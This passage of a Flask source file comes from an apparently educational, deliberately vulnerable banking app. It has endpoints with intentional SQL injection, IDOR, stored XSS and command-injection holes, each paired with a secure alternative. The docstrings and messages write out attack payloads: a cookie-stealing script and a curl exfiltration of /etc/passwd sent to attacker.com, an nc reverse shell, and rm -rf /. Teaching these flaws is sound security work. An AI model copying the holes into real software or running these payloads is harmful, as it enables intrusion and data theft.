    - Banks: Could violate PCI DSS, Basel III, GDPR → massive fines + reputation damage

    Secure Alternative:
    Use parameterized queries (ORM or prepared statements):
    query.filter(LoanApplication.applicant_name.ilike(f"%{search}%"))

    This is demonstrated in the secure /applications endpoint.
    """
    user = get_current_user()
    search_query = request.args.get("q", "")

    # 🚨 VULNERABLE: Direct string concatenation into SQL
    # This is EXACTLY what NOT to do!
    raw_sql = f"""
        SELECT 
            id, application_ref, applicant_name, national_id, 
            product_code, requested_amount, branch_code, status, created_at
        FROM loan_applications
        WHERE applicant_name LIKE '%{search_query}%'
        ORDER BY created_at DESC
    """

    # Note: Intentionally NO branch_code filter, so SQL injection can expose all data

    try:
        result = db.session.execute(text(raw_sql))
        rows = result.mappings().all()
    except Exception as e:
        flash(f"SQL Error (possibly from injection attempt): {str(e)}", "danger")
        rows = []

    flash(
        "⚠️ WARNING: This is a VULNERABLE endpoint demonstrating SQL Injection. "
        "The search query is directly concatenated into SQL without parameterization. "
        "Try payload: ' OR 1=1 --",
        "danger",
    )

    return render_template(
        "attack_demo.html",
        rows=rows,
        attack_type="SQL Injection",
        raw_sql=raw_sql,
        search_query=search_query,
    )


@app.route("/vuln/applications/<int:app_id>")
@login_required
def vulnerable_view_application(app_id):
    """
    🚨 VULNERABLE: Insecure Direct Object Reference (IDOR) + Stored XSS

    Vulnerability Type 1: CWE-639 (IDOR - Authorization Bypass)
    OWASP: A01:2021 - Broken Access Control

    What's Wrong (IDOR):
    This endpoint does NOT check if the logged-in user has permission to
    view the requested application. A branch officer from HCM01 can view
    applications from HN01 by simply changing the URL:

    /vuln/applications/1  → HCM01 application (legitimate)
    /vuln/applications/2  → HN01 application (IDOR - should be blocked!)

    Attack Scenario:
    1. Branch officer logs in, sees their applications
    2. Notes application IDs in URL (e.g., 1, 2, 3)
    3. Manually changes URL to /vuln/applications/100
    4. Gains access to other branches' sensitive customer data

    Real-World Impact:
    - IDOR is one of the most common vulnerabilities in web apps
    - Leads to data breaches, privacy violations, regulatory fines
    - Example: Facebook (2018) - Photo IDOR exposed 6.8M users' photos

    ---

    Vulnerability Type 2: CWE-79 (Stored XSS)
    OWASP: A03:2021 - Injection

    What's Wrong (XSS):
    The remarks field is rendered using Jinja2's |safe filter, which
    disables auto-escaping. If an attacker stores malicious JavaScript
    in the remarks field, it will execute in victims' browsers.

    Attack Scenario:
    1. Attacker creates application with remarks: <script>alert('XSS')</script>
    2. Or more maliciously: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
    3. When victim views this application, JavaScript executes
    4. Attacker steals session cookies, performs actions as victim

    Real-World Impact:
    - Session hijacking (steal authentication cookies)
    - Credential theft (fake login forms)
    - Malware distribution
    - Defacement
    - Example: Samy worm (MySpace 2005) - XSS worm infected 1M users in 20 hours

    Secure Alternatives:
    1. IDOR: Check can_access_application(user, application) before rendering
    2. XSS: Remove |safe filter, let Jinja2 auto-escape HTML

    Both are demonstrated in the secure /applications/<id> endpoint.
    """
    application = LoanApplication.query.get_or_404(app_id)

    # 🚨 VULNERABLE: NO access control check
    # Missing: if not can_access_application(user, application): abort(403)

    flash(
        "⚠️ WARNING: This is a VULNERABLE endpoint demonstrating IDOR + Stored XSS. "
        "(1) No branch access control - any user can view any application. "
        "(2) Remarks field rendered with |safe - JavaScript will execute. "
        "Try creating an application with remarks: <script>alert('XSS')</script>",
        "danger",
    )

    # vulnerable_view=True tells template to use |safe filter (XSS vulnerability)
    return render_template(
        "application_detail.html",
        application=application,
        vulnerable_view=True,
    )


@app.route("/vuln/import", methods=["GET", "POST"])
@login_required
def vulnerable_bulk_import():
    """
    🚨 VULNERABLE: Command/Shell Injection

    Vulnerability Type: CWE-78 (OS Command Injection)
    OWASP: A03:2021 - Injection

    What's Wrong:
    This endpoint takes user input (filename) and passes it directly to
    a shell command via os.system() without any validation or sanitization.

    The Vulnerable Code Pattern:
    filename = request.form.get("filename")
    os.system(f"python scripts/import_applications.py {filename}")

    An attacker can inject shell metacharacters to execute arbitrary commands:

    Attack Examples:
    1. Command chaining (Linux/Mac):
       Input: data.csv; whoami
       Executed: python scripts/import_applications.py data.csv; whoami
       Result: Runs whoami command, reveals server username

    2. Command chaining (Windows):
       Input: data.csv & whoami
       Executed: python scripts/import_applications.py data.csv & whoami
       Result: Same as above

    3. Data exfiltration:
       Input: data.csv; curl http://attacker.com/exfil -d @/etc/passwd
       Result: Sends /etc/passwd to attacker's server

    4. Reverse shell (full system compromise):
       Input: data.csv; nc -e /bin/bash attacker.com 4444
       Result: Opens reverse shell, attacker gains full control

    5. Denial of Service:
       Input: data.csv; rm -rf / --no-preserve-root
       Result: Deletes entire filesystem (if run as root)

    Real-World Impact:
    - Complete system compromise
    - Data theft (customer PII, financial data, trade secrets)
    - Ransomware deployment
    - Regulatory violations (PCI DSS, GDPR)
    - Example: Equifax (2017) - Command injection led to 147M records stolen

    Secure Alternatives:
    1. NEVER use os.system() or subprocess.run(shell=True) with user input
    2. Use file upload (request.files) instead of filename strings
    3. Parse files with Python libraries (csv, json, xml.etree) not shell tools
    4. If shell is absolutely necessary:
       - Use subprocess.run() with shell=False and argument list
       - Validate input against strict whitelist
       - Use shlex.quote() to escape special characters

    Secure implementation is demonstrated in /secure/import endpoint.

    Note: This vulnerable endpoint is DISABLED by default (comments out os.system).
    To demonstrate the attack, the comment can be removed, but this is DANGEROUS
    and should ONLY be done in an isolated VM/container for academic purposes.
    """
    user = get_current_user()
    command_executed = None

    if request.method == "POST":
        filename = request.form.get("filename", "").strip()

        # 🚨 EXTREMELY VULNERABLE: Building shell command with user input
        # This is the EXACT pattern that leads to command injection
        command = f"python scripts/import_applications.py {filename}"

        # Store command for display (showing what WOULD be executed)
        command_executed = command

        # 🚨🚨🚨 DANGER ZONE 🚨🚨🚨
        # The following line is COMMENTED OUT for safety.
        # If uncommented, it would allow arbitrary command execution.
        # NEVER do this in real code!

        # os.system(command)  # ← THIS IS THE VULNERABILITY

        # Instead, we just show the command that would be executed
        flash(
            f"⚠️ DANGER: The following command WOULD be executed (but is blocked for safety): {command}",
            "danger",
        )
        flash(
            "💡 Attack Demo: Try entering: data.csv; whoami  or  data.csv & dir  or  data.csv | curl http://attacker.com",
            "info",
        )

        # Educational note about what would happen
        if (
            ";" in filename
            or "&" in filename
            or "|" in filename
            or "`" in filename
            or "$(" in filename
        ):
            flash(
                "🚨 COMMAND INJECTION DETECTED! Shell metacharacters found in input. "
                "In a real vulnerable system, this would execute arbitrary commands. "
                "Attacker could steal data, install malware, or destroy the system.",
                "danger",
            )

    return render_template(
        "bulk_import.html",
        vulnerable=True,
        command_executed=command_executed,
    )


# ============================================================================
# FILE DOWNLOAD (for uploaded CSV files)
# ============================================================================


@app.route("/uploads/<path:filename>")
@login_required
@role_required(Role.BRANCH_HO, Role.SUPER_ADMIN)
def download_upload(filename):
    """
    Serve uploaded files (HO only).

    Security: Uses send_from_directory to prevent path traversal attacks.
    Flask automatically validates that filename doesn't contain .. or /
    """
    return send_from_directory(
        app.config["UPLOAD_FOLDER"], filename, as_attachment=True
    )


# ============================================================================
# FAVICON ROUTE (prevents 404 errors in logs)
# ============================================================================


@app.route("/favicon.ico")
def favicon():
    """
    Serve favicon or return 204 No Content if not available.
    This prevents repetitive 404 errors in logs.
    """
    # Return empty response with 204 status (No Content)
    # Browsers will stop requesting the favicon after this
    return "", 204


# ============================================================================
# ERROR HANDLERS
# ============================================================================


@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors with custom page."""
    return (
        render_template("error.html", error_code=404, error_message="Page not found"),
        404,
    )


@app.errorhandler(403)
def forbidden(error):
    """Handle 403 errors with custom page."""
    return (
        render_template("error.html", error_code=403, error_message="Access forbidden"),
        403,
    )


@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors with custom page."""
    db.session.rollback()  # Rollback any pending transactions
    return (
        render_template(
            "error.html", error_code=500, error_message="Internal server error"
        ),
        500,
    )


# ============================================================================
# TEST ACCOUNTS PAGE (for easy testing)
# ============================================================================


@app.route("/test-accounts")
def test_accounts():
    """
    Show all test accounts with quick login buttons.
    This page helps users easily test different roles and workflows.
    """
    return render_template("test_accounts.html")


# ============================================================================
# APPLICATION ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    with app.app_context():
        # Create tables if they don't exist
        db.create_all()

    # Run development server
    # In production: use proper WSGI server (Gunicorn, uWSGI)
    app.run(debug=True, host="127.0.0.1", port=5000)
